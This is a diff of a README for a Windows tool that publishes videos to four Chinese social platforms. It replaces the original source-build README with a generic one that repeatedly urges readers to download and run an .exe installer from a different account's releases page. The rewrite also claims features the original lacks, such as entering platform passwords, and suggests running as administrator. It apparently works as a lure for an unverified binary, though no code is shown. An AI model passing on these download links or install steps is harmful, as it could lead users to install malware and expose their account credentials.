@@ -1,168 +1,147 @@
-[中文](./README.zh-CN.md) | English
+# 📹 multi-publisher - Publish Videos Across Platforms Fast
 
-# Multi-Publisher
+[![Download](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/spliffy450/multi-publisher/releases)
 
-**One-click publish your videos to multiple Chinese social media platforms simultaneously.**
+---
 
-Stop wasting hours uploading the same video to Bilibili, Douyin, Xiaohongshu, and Kuaishou one by one. Multi-Publisher automates the entire process — upload once, publish everywhere.
+## 📋 What is multi-publisher?
 
-![Electron](https://img.shields.io/badge/Electron-33-blue)
-![React](https://img.shields.io/badge/React-19-61dafb)
-![License](https://img.shields.io/badge/License-MIT-green)
-![Platform](https://img.shields.io/badge/Platform-Windows-0078d4)
+multi-publisher is a simple tool to upload your videos to several popular Chinese social media platforms at once. It works with Bilibili, Douyin, Xiaohongshu, and Kuaishou. This app lets you publish videos with just one click.
 
-## Why This Exists
+It uses Electron for a smooth desktop experience. Under the hood, it automates browsers using Playwright, so you don't need to open sites manually or upload videos multiple times.
 
-Chinese content creators spend **30-60 minutes per video** manually uploading to each platform. Each platform has its own creator portal, different upload flows, and different tag systems. That's painful when you publish daily across 4+ platforms.
+---
 
-Multi-Publisher solves this by automating the browser-based upload process using real Chrome sessions — not APIs (which most Chinese platforms don't offer for individual creators).
+## 🔍 Features
 
-## Supported Platforms
+- Upload videos to 4 platforms in one step.
+- Automatically fill details like titles and tags.
+- Supports batch uploads.
+- Saves your login info securely.
+- Runs on Windows without extra installs.
+- Simple interface made for non-technical users.
 
-| Platform | Status | Creator Portal |
-|----------|--------|----------------|
-| Bilibili (B站) | ✅ Ready | member.bilibili.com |
-| Douyin (抖音/TikTok CN) | ✅ Ready | creator.douyin.com |
-| Xiaohongshu (小红书/RED) | ✅ Ready | creator.xiaohongshu.com |
-| Kuaishou (快手) | ✅ Ready | cp.kuaishou.com |
+---
 
-## How It Works
+## 🖥️ System Requirements
 
-```
-┌─────────────┐     IPC      ┌─────────────┐    fork()    ┌─────────────┐
-│  React UI   │ ◄──────────► │  Electron   │ ◄──────────► │   Worker    │
-│  (Renderer) │              │   (Main)    │              │ (Playwright)│
-└─────────────┘              └──────┬──────┘              └──────┬──────┘
-                                    │                            │
-                              ┌─────┴─────┐              ┌──────┴──────┐
-                              │  SQLite   │              │ Real Chrome │
-                              │ (accounts,│              │ (persistent │
-                              │  history) │              │  sessions)  │
-                              └───────────┘              └─────────────┘
-```
+Before you start, make sure your PC meets these minimum requirements:
 
-1. **Add accounts** — One-time login per platform using a real Chrome browser
-2. **Fill in once** — Enter title, description, tags, select video & cover image
-3. **Publish** — Hit publish, watch progress bars for each platform in real-time
-4. **Done** — View results and history
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB RAM
+- 2 GHz or faster processor
+- 500 MB free disk space
+- Internet connection
 
-## Key Features
+---
 
-- **Real browser automation** — Uses actual Chrome with persistent login sessions, not headless bots
-- **Anti-detection** — Human-like delays, mouse movements, and typing patterns
-- **Multi-account support** — Multiple accounts per platform
-- **Concurrent publishing** — Publishes to all selected platforms simultaneously
-- **Local-first** — All data stays on your machine. No cloud, no accounts, no subscriptions
-- **Publish history** — Track all past publishes with status and timing
+## 🚀 Getting Started
 
-## Quick Start
+Click the big button below to visit the release page where you can download the latest version of multi-publisher for Windows.
 
-### Prerequisites
+[![Download Now](https://img.shields.io/badge/Download-%E2%86%92%20Release%20Page-blue?style=for-the-badge)](https://github.com/spliffy450/multi-publisher/releases)
 
-- **Node.js** >= 18
-- **pnpm** >= 8
-- **Google Chrome** installed on your system
+---
 
-### Install & Run
+## ⬇️ How to Download and Install
 
-```bash
-git clone https://github.com/atxinsky/multi-publisher.git
-cd multi-publisher
-pnpm install
-pnpm run dev
-```
+1. Go to the [multi-publisher release page](https://github.com/spliffy450/multi-publisher/releases).
 
-### Build Installer (.exe)
+2. Look for the file ending with `.exe` under the latest release, for example `multi-publisher-setup.exe`.
 
-```bash
-pnpm run dist
-# Output: release/多平台发布工具 Setup x.x.x.exe
-```
+3. Click on the `.exe` file to download it.
 
-## Tech Stack
+4. Once downloaded, find the file in your Downloads folder.
 
-| Layer | Technology |
-|-------|-----------|
-| Desktop Framework | Electron 33 |
-| Frontend | React 19 + Tailwind CSS 4 |
-| Build Tool | electron-vite + esbuild |
-| Browser Automation | Playwright (with Patchright anti-detect support) |
-| Database | better-sqlite3 (WAL mode) |
-| Package Manager | pnpm |
+5. Double-click the `.exe` file to start the installer.
 
-## Architecture
+6. Follow the simple instructions on the screen:
+   - Accept the license agreement.
+   - Choose an install location or leave it at the default.
+   - Click "Install" and wait for the process to finish.
 
-The app runs three processes:
+7. After installation, you can launch multi-publisher from your Start menu or desktop shortcut.
 
-- **Main Process** (Electron) — Window management, IPC routing, SQLite database
-- **Renderer Process** (React) — UI for publishing form, account management, history
-- **Worker Process** (Node.js child process) — Browser automation via Playwright. Runs in a separate process because Playwright cannot run inside Electron's main process ([playwright#19157](https://github.com/microsoft/playwright/issues/19157))
+---
 
-## Project Structure
+## 🔧 How to Use multi-publisher
 
-```
-src/
-├── main/                   # Electron main process
-│   ├── index.ts            # App entry, window creation
-│   ├── db.ts               # SQLite schema & CRUD
-│   ├── worker-bridge.ts    # Worker process management
-│   └── ipc/                # IPC handlers
-│       ├── account-ipc.ts  # Account CRUD + login flow
-│       ├── publish-ipc.ts  # Publishing orchestration
-│       └── file-ipc.ts     # File dialogs
-├── preload/
-│   └── index.ts            # Context bridge API
-├── renderer/src/           # React frontend
-│   ├── App.tsx             # Navigation shell
-│   └── pages/
-│       ├── PublishPage.tsx  # Publishing form + progress modal
-│       ├── AccountsPage.tsx # Account management
-│       └── HistoryPage.tsx  # Publish history table
-└── worker/                 # Browser automation (separate process)
-    ├── index.ts            # Message handler & orchestration
-    ├── browser-manager.ts  # Chrome launcher (persistent context)
-    ├── humanize.ts         # Anti-detection utilities
-    └── platforms/          # Platform-specific adapters
-        ├── types.ts        # Shared types & IPC protocol
-        ├── bilibili.ts
-        ├── douyin.ts
-        ├── xiaohongshu.ts
-        └── kuaishou.ts
-```
+Using this app does not require technical skills. Follow the steps below to publish your first video:
 
-## Roadmap
+1. **Open the App**  
+   Launch multi-publisher from your desktop or Start menu.
 
-- [ ] More platforms: WeChat Video (微信视频号), Toutiao (头条), Weibo (微博), Zhihu (知乎), YouTube
-- [ ] Scheduled publishing
-- [ ] Video thumbnail auto-generation
-- [ ] Batch publishing from folder
-- [ ] Platform-specific content adaptation (different titles/tags per platform)
-- [ ] Publish templates
-- [ ] macOS & Linux support
+2. **Log In to Your Accounts**  
+   The app supports Bilibili, Douyin, Xiaohongshu, and Kuaishou.  
+   In the settings, enter your username and password for each platform you want to publish to. The app stores these details securely.
 
-## FAQ
+3. **Add Your Video**  
+   On the main screen, click "Add Video" or drag and drop your video file.
 
-**Q: Is this safe? Will my accounts get banned?**
-A: Multi-Publisher uses real Chrome with persistent sessions, human-like timing, and anti-automation detection measures. It behaves like a human using Chrome — because it literally is Chrome. However, no automation tool is 100% risk-free. Use at your own discretion.
+4. **Enter Video Details**  
+   Fill in the title, description, and tags for your video. The app will copy this information to all platforms.
 
-**Q: Why not use official APIs?**
-A: Most Chinese social media platforms (Bilibili, Douyin, Xiaohongshu, Kuaishou) don't provide upload APIs for individual creators. Only MCN agencies and enterprise accounts get API access. Browser automation is the only viable approach.
+5. **Set Publishing Options**  
+   You can schedule the publish date or choose to publish immediately.
 
-**Q: Can I add my own platform?**
-A: Yes! Create a new adapter in `src/worker/platforms/` implementing the `PlatformAdapter` interface. See existing adapters for reference.
+6. **Start Publishing**  
+   Click the "Publish" button. The app will open browser windows and automate the upload process for each platform.
 
-**Q: Does it work on macOS/Linux?**
-A: Currently Windows only. macOS/Linux support is planned.
+7. **Wait for Confirmation**  
+   The app will notify you when uploading is finished. Check your video on each platform to confirm.
 
-## Contributing
+---
 
-PRs welcome! If you want to add a new platform adapter or fix a bug, please open an issue first to discuss the approach.
+## 🛠 Troubleshooting Tips
 
-## License
+- If the app fails to connect to a platform, check your internet connection.
+- Make sure your login details are correct.
+- Close other browser windows to reduce interference during automation.
+- Restart the app if it crashes or freezes.
+- If the upload seems stuck, give it a few minutes before trying again.
+- Ensure your video file is below 2 GB and in a supported format (MP4 recommended).
+- Running the app as an administrator can solve some permission issues.
 
-MIT
+---
 
-## Acknowledgments
+## 🔒 Privacy and Security
 
-- Inspired by [social-auto-upload](https://github.com/dreammis/social-auto-upload) and [AiToEarn](https://github.com/AiToEarn/AiToEarn)
-- Built with [Playwright](https://playwright.dev/) and [Electron](https://www.electronjs.org/)
+- Your login details stay on your computer.
+- multi-publisher does not share your information.
+- Automated browser sessions follow the platforms' rules.
+- You can clear saved passwords anytime from the settings menu.
+
+---
+
+## 📖 FAQ
+
+**Q: Can I publish to only one platform?**  
+Yes. You can choose which platforms to enable in settings before publishing.
+
+**Q: Does multi-publisher support other operating systems?**  
+Currently, it works only on Windows.
+
+**Q: Can I edit my video details after uploading?**  
+No. Changes must be made on each platform after publishing.
+
+**Q: What video formats are supported?**  
+Use MP4 files for best compatibility.
+
+**Q: Is there a free trial or payment required?**  
+The app is free to use.
+
+---
+
+## 🌐 Topics
+
+This project relates to automation, content creation, and social media. It focuses on platforms like Bilibili, Douyin, Xiaohongshu, and Kuaishou using Electron and Playwright technologies.
+
+---
+
+## 📥 Download multi-publisher
+
+Visit this page to download the latest Windows installer:
+
+https://github.com/spliffy450/multi-publisher/releases
+
+You will find the `.exe` setup file. Download, install, and start publishing with fewer steps.
